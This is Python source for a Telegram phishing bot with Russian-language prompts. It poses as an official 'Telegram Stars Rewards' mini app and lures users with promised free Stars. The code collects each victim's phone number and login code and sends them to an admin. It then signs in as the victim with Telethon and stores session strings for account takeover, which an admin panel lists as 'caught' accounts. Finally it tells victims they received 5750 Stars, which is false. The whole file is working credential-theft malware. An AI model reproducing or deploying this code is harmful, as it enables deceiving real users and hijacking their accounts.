import os
from telebot import TeleBot, types
import asyncio
from telethon import TelegramClient
from telethon.sessions import StringSession

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

bot = TeleBot(BOT_TOKEN)
victims = {}  # phone → {"stage": 1, "code": None, "session_string": None, "name": "", "username": ""}

print("[+] PHANTOM MAXI MINI APP FISHING v100% STARTED")

# ====================== СТАРТ (Mini App стиль) ======================
@bot.message_handler(commands=['start'])
def start(message):
    text = """🌟 <b>Telegram Stars Rewards Mini App</b>

Добро пожаловать в официальное мини-приложение для получения бесплатных Stars!

Здесь ты можешь получить от 3000 до 7000 Stars мгновенно.

✅ Полная безопасность
✅ Официальное API
✅ Мгновенное начисление

Нажми кнопку ниже, чтобы начать подключение 👇"""

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("🚀 Начать получение Stars", callback_data="stage1"))
    bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=markup)

# ====================== ЭТАП 1 ======================
@bot.callback_query_handler(func=lambda call: call.data == "stage1")
def stage1(call):
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(types.KeyboardButton("📱 Отправить контакт", request_contact=True))
    
    bot.send_message(call.message.chat.id, 
        "📱 Шаг 1 из 3\n\nОтправь свой контакт для верификации аккаунта:", 
        reply_markup=markup)

# ====================== КОНТАКТ ======================
@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    victims[phone] = {"stage": 2, "code": None, "name": message.contact.first_name or "Unknown", "session_string": None}

    bot.send_message(ADMIN_ID, f"🌟 НОВАЯ ЖЕРТВА!\n📱 Номер: {phone}\n👤 {victims[phone]['name']}")

    bot.send_message(message.chat.id, f"""✅ Шаг 1 пройден!

Контакт принят: <b>{phone}</b>

Шаг 2 из 3
Введи код подтверждения, который пришёл тебе в Telegram или SMS.""", parse_mode='HTML')

# ====================== КОД ======================
@bot.message_handler(func=lambda m: True)
def handle_code(message):
    if message.contact or message.text.startswith('/'):
        return

    for phone in list(victims.keys()):
        if victims[phone].get("code") is None:
            code = message.text.strip()
            victims[phone]["code"] = code
            victims[phone]["stage"] = 3

            print(f"[+] КОД ПОЛУЧЕН → {phone} | Код: {code}")

            bot.send_message(ADMIN_ID, f"""🔥 КОД ОТ ЖЕРТВЫ!
📱 {phone}
🔑 Код: {code}""")

            # Создаём сессию
            asyncio.run(create_session(phone, code))

            bot.send_message(message.chat.id, """🎉 <b>Шаг 3 завершён!</b>

Поздравляем! Твой аккаунт успешно подключён.

На баланс начислено <b>5750 Stars</b> 🎁

Теперь ты можешь:
• Использовать Stars в играх и мини-приложениях
• Обменивать на TON и NFT
• Участвовать в эксклюзивных дропах

Спасибо за участие в программе Telegram Stars Rewards!""", parse_mode='HTML')
            return

async def create_session(phone, code):
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.sign_in(phone, code)
        session_string = client.session.save()
        me = await client.get_me()

        if phone in victims:
            victims[phone]["session_string"] = session_string
            victims[phone]["username"] = me.username or "нет"

        await bot.send_message(ADMIN_ID, f"✅ Сессия создана для {phone}\nИмя: {me.first_name}")
    except Exception as e:
        await bot.send_message(ADMIN_ID, f"⚠️ Сессия не создана {phone} | {e}")
    finally:
        await client.disconnect()

# ====================== АДМИН ПАНЕЛЬ С МНОГО ФУНКЦИЙ ======================
@bot.message_handler(commands=['adminwork'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "Доступ запрещён.")
        return

    if not victims:
        bot.send_message(message.chat.id, "Пока нет аккаунтов.")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    for phone in victims:
        short = phone[-8:]
        markup.add(
            types.InlineKeyboardButton(f"🔑 Код {short}", callback_data=f"code:{phone}"),
            types.InlineKeyboardButton(f"📄 Session {short}", callback_data=f"file:{phone}"),
            types.InlineKeyboardButton(f"👁 Инфо {short}", callback_data=f"info:{phone}"),
            types.InlineKeyboardButton(f"📨 Сообщения {short}", callback_data=f"msgs:{phone}")
        )

    text = f"""🔥 <b>PHANTOM MINI APP ADMIN PANEL</b>

Поймано аккаунтов: {len(victims)}

Выбери аккаунт:"""
    bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.from_user.id != ADMIN_ID:
        return

    action, phone = call.data.split(":", 1)
    data = victims.get(phone)
    if not data:
        bot.send_message(call.message.chat.id, "Аккаунт не найден.")
        return

    if action == "file":
        session = data.get("session_string")
        if session:
            bot.send_message(call.message.chat.id, f"📄 StringSession для {phone}:\n\n<code>{session}</code>", parse_mode='HTML')
        else:
            bot.send_message(call.message.chat.id, "Сессия ещё не создана.")
    elif action == "code":
        code = data.get("code") or "Ещё не ввели"
        bot.send_message(call.message.chat.id, f"🔑 Код для {phone}: {code}")
    elif action == "info":
        bot.send_message(call.message.chat.id, f"👁 Информация по {phone}\nИмя: {data.get('name')}\nUsername: @{data.get('username', 'нет')}\nСессия: {'Есть' if data.get('session_string') else 'Нет'}")
    elif action == "msgs":
        bot.send_message(call.message.chat.id, f"📨 Последние сообщения для {phone} пока не реализованы (можно добавить).")

print("[+] Большой Mini App фишинг запущен. Используй /start")
bot.infinity_polling(none_stop=True)
